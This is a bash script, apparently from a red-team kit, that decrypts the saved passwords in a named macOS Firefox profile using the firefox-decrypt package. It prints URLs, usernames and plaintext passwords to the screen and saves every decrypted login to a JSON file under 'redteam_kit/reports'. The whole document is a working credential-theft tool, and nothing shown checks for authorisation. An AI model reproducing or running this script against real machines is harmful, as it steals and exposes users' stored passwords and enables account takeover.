#!/bin/bash
# Quick Firefox Password Decryption Test
# This will decrypt passwords if firefox-decrypt is installed

PROFILE_PATH="$HOME/Library/Application Support/Firefox/Profiles/yxo4pq2t.default-release"

echo "======================================================================"
echo "Firefox Password Decryption Test"
echo "======================================================================"
echo ""

# Check if firefox-decrypt is installed
python3 << 'EOF' 2>/dev/null
try:
    import firefox_decrypt
    print("✅ firefox-decrypt is installed")
    exit(0)
except ImportError:
    print("❌ firefox-decrypt is NOT installed")
    print("")
    print("Install with: pip3 install firefox-decrypt")
    print("Then run this script again to decrypt passwords.")
    exit(1)
EOF

INSTALLED=$?

if [ $INSTALLED -eq 0 ]; then
    echo ""
    echo "[*] Decrypting Firefox passwords..."
    echo ""
    
    python3 << EOF
from firefox_decrypt import decrypt_passwords
import json
import os

profile_path = "$PROFILE_PATH"
passwords = decrypt_passwords(profile_path)

print(f"✅ Successfully decrypted {len(passwords)} passwords!")
print()
print("=" * 70)
print("DECRYPTED PASSWORDS (First 10)")
print("=" * 70)
print()

for i, entry in enumerate(passwords[:10], 1):
    print(f"[Login {i}]")
    print(f"  URL: {entry.get('url', 'N/A')}")
    print(f"  Username: {entry.get('username', 'N/A')}")
    password = entry.get('password', '')
    if password:
        print(f"  Password: {password}")
    print()

if len(passwords) > 10:
    print(f"... and {len(passwords) - 10} more passwords")
    print()

# Save to file
output_file = "redteam_kit/reports/firefox_decrypted_passwords.json"
os.makedirs(os.path.dirname(output_file), exist_ok=True)

with open(output_file, 'w') as f:
    json.dump(passwords, f, indent=2)

print(f"[+] All passwords saved to: {output_file}")
print("=" * 70)
EOF

else
    echo ""
    echo "Note: Due to resource limits, firefox-decrypt installation must be done manually."
    echo "The code is ready to decrypt passwords once firefox-decrypt is installed."
fi

